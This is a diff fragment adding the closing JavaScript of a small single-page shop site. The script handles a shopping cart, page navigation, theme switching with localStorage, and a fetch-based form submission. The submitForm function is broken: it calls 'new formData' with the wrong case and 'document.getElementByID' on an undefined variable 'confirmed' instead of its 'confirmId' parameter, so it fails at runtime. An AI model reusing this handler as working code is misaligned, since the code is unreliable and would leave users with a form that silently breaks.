+
+
+  function addToCart(id) { cart[id] = (cart[id] || 0) + 1; saveCart(); renderCart(); toggleCart(true); }
+  function changeQty(id, delta) {
+    cart[id] = (cart[id] || 0) + delta;
+    if (cart[id] <= 0) delete cart[id];
+    saveCart(); renderCart();
+  }
+
+
+
+
+  function renderCart() {
+    var items = document.getElementById('cartItems');
+    var ids = Object.keys(cart);
+    var total = 0;
+    if (!ids.length) {
+      items.innerHTML = '<p class="cart-empty">Your cart is empty.</p>';
+    } else {
+      items.innerHTML = ids.map(function(id){
+        var p = PRODUCTS.find(function(x){ return x.id === id; });
+        total += cart[id] * p.price;
+        return '<div class="cart-line"><div class="info"><strong>' + p.name + '</strong><span>$' + p.price.toFixed(2) + ' each</span></div>' +
+          '<div class="qty-ctrl"><button onclick="changeQty(\'' + id + '\',-1)">−</button>' + cart[id] + '<button onclick="changeQty(\'' + id + '\',1)">+</button></div></div>';
+      }).join('');
+    }
+    var totalCount = Object.values(cart).reduce(function(a,b){ return a+b; }, 0);
+    document.getElementById('cartCount').textContent = totalCount;
+    document.getElementById('cartTotal').textContent = '$' + total.toFixed(2);
+  }
+
+
+
+
+  function toggleCart(open) {
+    document.getElementById('cartDrawer').classList.toggle('open', open);
+    document.getElementById('cartOverlay').classList.toggle('open', open);
+  }
+
+
+
+
+  function go(page) {
+    document.querySelectorAll('.page').forEach(function(p){ p.classList.remove('active'); });
+    document.getElementById(page).classList.add('active');
+    document.querySelectorAll('.navlinks button[data-page]').forEach(function(b){ b.classList.toggle('active', b.dataset.page === page); });
+    window.scrollTo({ top:0, behavior:'instant' });
+    try { localStorage.setItem('Pepper_last_page', page); } catch(e) {}
+  }
+
+
+
+
+  function submitForm(e, confirmId) {
+    e.preventDefault();
+    var form = e.target;
+    fetch(form.action, {
+      method: 'POST',
+      body: new formData(form),
+      headers: {'Accept': 'application/json'}
+   }) .then(function(res) {
+    if (res.ok) {
+      document.getElementByID(confirmed).classList.add('show');
+      form.reset();
+    } else{
+      alert('Something went Wrong - please try again');
+    }
+   }) .catch(function() {
+    alert('Something went wrong - please try again.');
+   });
+   return false;
+  }
+
+
+
+
+  function toggleTheme() {
+    var root = document.documentElement;
+    var next = root.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
+    root.setAttribute('data-theme', next);
+    try { localStorage.setItem('Pepper_theme', next); } catch(e) {}
+  }
+
+
+
+
+  (function init() {
+    try { var t = localStorage.getItem('Pepper_theme'); if (t) document.documentElement.setAttribute('data-theme', t); } catch(e) {}
+    renderProducts();
+    renderCart();
+    go('home');
+  })();
+</script>
+
+
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
